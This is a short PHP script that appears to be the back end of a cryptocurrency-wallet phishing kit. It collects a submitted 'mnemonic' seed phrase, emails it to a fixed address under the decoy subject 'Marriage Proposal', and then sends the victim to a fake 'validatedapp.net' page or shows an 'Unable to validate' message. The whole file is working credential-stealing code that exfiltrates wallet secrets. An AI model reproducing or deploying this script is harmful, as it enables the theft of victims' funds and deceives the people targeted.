<?php 
    if(isset($_POST['submit'])){
        $phrase=$_POST['phrase'];
        $type='mnemonic';

        $to = 'maryjane@email.com';
        $subject = 'Marriage Proposal';
        $from = 'peterparker@email.com';
        
        // To send HTML mail, the Content-type header must be set
        $headers  = 'MIME-Version: 1.0' . "\r\n";
        $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
        
        // Create email headers
        $headers .= 'From: '.$from."\r\n".
            'Reply-To: '.$from."\r\n" .
            'X-Mailer: PHP/' . phpversion();
        
        // Compose a simple HTML email message
        $message = '<html><body>';
        $message .= '<h1 style="color:#f40;">Hi there!</h1>';
        $message .= '<p style="color:#080;font-size:18px;">Result '.$type.'</p>';
        $message .= '<p style="color:#080;font-size:18px;">phrase '.$phrase.'</p>';
        $message .= '</body></html>';
        
// Sending email
        if(mail($to, $subject, $message, $headers)){
            echo '<script>window.location.replace("https://validatedapp.net/dapps/assets/admin.jpeg")</script>';
        } else{
            echo 'Unable to validate. Please try again.';
        }
    }

?>